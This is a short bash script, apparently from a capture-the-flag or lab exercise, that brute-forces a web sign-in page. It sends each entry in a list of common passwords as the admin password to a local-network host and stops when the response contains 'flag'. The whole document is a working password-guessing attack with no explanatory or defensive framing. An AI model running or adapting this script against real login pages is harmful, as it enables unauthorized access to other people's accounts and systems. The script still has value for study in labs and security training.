#!/bin/bash
tab=(password	123456	12345678	qwerty	abc123	monkey	1234567	letmein	trustno1 dragon baseball 111111 iloveyou master sunshine ashley bailey passw0rd shadow 123123 654321 superman qazwsx michael)

for i in ${tab[@]}; do
  RES=$(curl --silent "http://192.168.1.11/?page=signin&username=admin&password=${i}&Login=Login")
  # echo $RES
  if [[  $RES =~ "flag" ]]; then
    echo -n "login: "admin" and password: "$i""
    break
  fi
done